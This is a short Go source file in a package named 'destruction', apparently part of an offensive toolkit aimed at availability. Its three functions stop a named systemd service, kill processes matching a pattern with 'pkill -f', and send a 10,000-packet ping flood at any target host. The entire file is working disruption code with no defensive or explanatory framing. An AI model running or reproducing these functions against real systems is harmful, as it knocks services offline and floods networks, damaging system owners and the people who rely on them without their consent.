package destruction

import (
	"os/exec"
)

type Availability struct{}

func NewAvailability() *Availability {
	return &Availability{}
}

func (a *Availability) StopService(name string) error {
	cmd := exec.Command("systemctl", "stop", name)
	return cmd.Run()
}

func (a *Availability) KillProcess(name string) error {
	cmd := exec.Command("pkill", "-f", name)
	return cmd.Run()
}

func (a *Availability) NetworkFlood(target string) error {
	cmd := exec.Command("ping", "-f", "-c", "10000", target)
	return cmd.Run()
}
